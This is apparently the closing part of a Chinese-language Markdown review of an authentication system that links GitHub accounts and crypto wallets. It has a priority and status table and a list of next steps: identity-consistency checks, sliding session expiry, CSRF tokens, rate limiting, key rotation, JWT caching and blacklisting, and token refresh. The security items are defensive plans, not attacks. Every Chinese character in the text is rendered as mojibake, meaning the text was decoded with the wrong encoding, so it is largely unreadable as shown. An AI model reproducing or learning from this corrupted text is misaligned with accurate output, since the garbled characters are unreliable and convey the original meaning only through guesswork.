| 1.5 å®‰å…¨æ€§ | å®‰å…¨æ€§ | é«˜ | P0 | âœ… åŸºæœ¬å®ç° |
| 1.6 ç”¨æˆ·ä½“éªŒ | ç”¨æˆ·ä½“éªŒ | ä¸­ | P1 | âš ï¸ éœ€ä¼˜åŒ– |
| 1.7 æ€§èƒ½é—®é¢˜ | æ€§èƒ½ | ä½ | P2 | âœ… å¯æ¥å— |
| 1.8 é”™è¯¯å¤„ç† | ç¨³å®šæ€§ | ä¸­ | P1 | âœ… åŸºæœ¬å®ç° |

---

## ä¸‹ä¸€æ­¥å»ºè®®

### é«˜ä¼˜å…ˆçº§ï¼ˆP0-P1ï¼‰

1. **å®ç°èº«ä»½ä¸€è‡´æ€§æ£€æŸ¥**
   - æ£€æµ‹ GitHub ä¸é’±åŒ…ç»‘å®šä¸ä¸€è‡´
   - å¼•å¯¼ç”¨æˆ·è§£å†³èº«ä»½å†²çª

2. **ä¼˜åŒ– Session ç®¡ç†**
   - å®ç°æ»‘åŠ¨è¿‡æœŸæœºåˆ¶
   - æ·»åŠ  Session å³å°†è¿‡æœŸæé†’

3. **æ”¹è¿›é¦–æ¬¡ä½¿ç”¨æµç¨‹**
   - ç®€åŒ–æ³¨å†Œæ­¥éª¤
   - æä¾›"ä»…æŸ¥çœ‹"æ¨¡å¼

### ä¸­ä¼˜å…ˆçº§ï¼ˆP2ï¼‰

4. **å¢å¼ºå®‰å…¨æ€§**
   - æ·»åŠ  CSRF Token
   - å®æ–½ Rate Limiting
   - å¯†é’¥è½®æ¢æœºåˆ¶

5. **æå‡æ€§èƒ½**
   - JWT éªŒè¯ç»“æœç¼“å­˜
   - ä¸­é—´ä»¶å±‚ç»Ÿä¸€éªŒè¯

### ä½ä¼˜å…ˆçº§ï¼ˆåç»­ä¼˜åŒ–ï¼‰

6. **æ”¯æŒå¤šé’±åŒ…ç»‘å®š**
7. **å®ç° JWT é»‘åå•ï¼ˆéœ€è¦ Redisï¼‰**
8. **Access Token åˆ·æ–°æœºåˆ¶**

